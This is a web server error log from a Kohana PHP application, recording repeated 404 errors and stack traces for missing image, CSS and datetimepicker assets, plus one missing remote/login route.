2025-10-24 18:50:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/subArrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/active_company.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/active_company.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/icons/notifications/lightbulb.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/icons/notifications/lightbulb.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/subIcon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/subIcon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/icons/images/subIcon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/icons/images/subIcon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/icons/notifications/email.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/icons/notifications/email.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/navBg.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/navBg.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/subNavBg.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/subNavBg.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/ui/sliderBgVert.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/ui/sliderBgVert.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/green_arrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/green_arrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/box-grad.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/box-grad.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/select_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/select_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/select_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/images/select_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/divider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/divider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/highlight.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/highlight.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/noise.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/admin_new/noise.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/radiobutton.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/radiobutton.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_75_e6e6e6_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_75_e6e6e6_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_flat_0_aaaaaa_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_flat_0_aaaaaa_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_75_dadada_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_75_dadada_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_flat_75_ffffff_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_flat_75_ffffff_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_55_fbf9ee_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_55_fbf9ee_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_95_fef1ec_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_95_fef1ec_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_cd0a0a_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_cd0a0a_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_65_ffffff_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_glass_65_ffffff_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_2e83ff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_2e83ff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL remote/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 18:51:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL remote/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 18:51:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_888888_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_888888_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_highlight-soft_75_cccccc_1x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-bg_highlight-soft_75_cccccc_1x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_454545_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/ui-icons_454545_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:51:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/animated-overlay.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:51:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/datetimepicker/images/animated-overlay.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/check-off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/check-off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/check-on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/check-on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images-170518/img/star-matrix.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images-170518/img/star-matrix.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images-170518/img/btn_prev.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images-170518/img/btn_prev.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/team_mem1.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/team_mem1.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/team_mem2.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/team_mem2.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images-170518/img/btn_next.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images-170518/img/btn_next.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/we_hire_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/we_hire_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ad_feature_banner.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ad_feature_banner.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_shadow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_shadow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_right_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_right_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:21 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/red.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:21 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/red.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yellw_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yellw_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_left_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_left_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yello_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yello_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yello_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yello_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bottom_shadow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bottom_shadow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_5.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_5.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_7.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_7.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_6.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_6.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_8.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_8.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_3.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_3.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_one.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_one.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_4.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver_4.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver9.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ver9.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/release_notes.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/release_notes.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yellw_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yellw_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yell_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yello_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yello_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/howit1.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/howit1.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
